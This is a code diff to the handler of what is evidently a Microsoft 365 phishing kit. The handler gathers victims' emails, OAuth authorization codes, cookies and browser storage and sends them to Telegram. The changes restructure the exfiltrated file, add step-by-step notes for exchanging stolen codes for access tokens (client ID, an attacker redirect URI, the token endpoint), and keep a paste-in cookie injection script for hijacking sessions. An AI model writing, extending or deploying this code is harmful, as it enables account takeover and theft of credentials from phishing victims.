@@ -70,12 +70,10 @@ export const handler = async (event, context) => {
     messageText += `📧 Email: ${email}\n`;
     messageText += `🌐 Domain: ${domain}\n`;
     messageText += `🔑 Session ID: ${sessionId}\n`;
-    messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured' : 'Missing'}\n`;
+    messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see file)' : 'Missing'}\n`;
     messageText += `🕒 Time: ${timestamp}\n\n`;
     
-    if (authCode && authCode !== 'Not captured') {
-      messageText += `📋 Authorization Code:\n\`${authCode}\`\n\n`;
-    }
+    // Note: Authorization code is in the file, not in text message for security
     
     // Add cookie info if available
     if (data.cookies && Array.isArray(data.cookies) && data.cookies.length > 0) {
@@ -172,30 +170,55 @@ export const handler = async (event, context) => {
         : `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;
 
       // Create cookies file content
-      const cookiesFileContent = `// Microsoft 365 Cookie Data for ${email} - ${timestamp}
-// Authorization Code: ${authCode ? 'Captured' : 'Not captured'}
-// Session ID: ${sessionId}
+      const cookiesFileContent = `// ====================================================
+// MICROSOFT 365 OAUTH CREDENTIALS - ${timestamp}
+// ====================================================
+// Email: ${email}
 // Domain: ${domain}
+// Session ID: ${sessionId}
 // Cookies Found: ${microsoftCookies.length}
+// ====================================================
 
-let email = "${email}";
-let sessionId = "${sessionId}";
+// *** AUTHORIZATION CODE (PRIMARY CREDENTIAL) ***
+// Use this code to exchange for access tokens via Microsoft OAuth API
+// Expires in 10 minutes from issuance
 let authorizationCode = "${authCode || 'Not captured'}";
 
-// Cookie Injection Script (paste in browser console on Microsoft login page):
+// *** USER INFORMATION ***
+let email = "${email}";
+let sessionId = "${sessionId}";
+let domain = "${domain}";
+let timestamp = "${timestamp}";
+
+// *** AUTHORIZATION CODE FOR COPY/PASTE ***
+/*
+${authCode || 'Not captured'}
+*/
+
+// *** OAUTH DETAILS FOR TOKEN EXCHANGE ***
+/*
+CLIENT_ID: eabd0e31-5707-4a85-aae6-79c53dc2c7f0
+REDIRECT_URI: https://vaultydocs.com/oauth-callback
+SCOPE: openid profile email User.Read
+GRANT_TYPE: authorization_code
+TOKEN_ENDPOINT: https://login.microsoftonline.com/common/oauth2/v2.0/token
+*/
+
+// *** COOKIE INJECTION SCRIPT ***
+// Paste this in browser console on Microsoft login page:
 ${jsInjectionCode}
 
-// Raw Cookie Data:
+// *** RAW COOKIE DATA ***
 ${JSON.stringify(microsoftCookies, null, 2)}
 
+// *** BROWSER STORAGE DATA ***
 // Session Storage:
 ${data.browserFingerprint?.sessionStorage || 'Empty'}
 
 // Local Storage:
 ${data.browserFingerprint?.localStorage || 'Empty'}
 
-// Authorization Code (for manual use):
-// ${authCode || 'Not captured'}
+// *** END OF FILE ***
 `;
 
       // Send cookies as file to Telegram
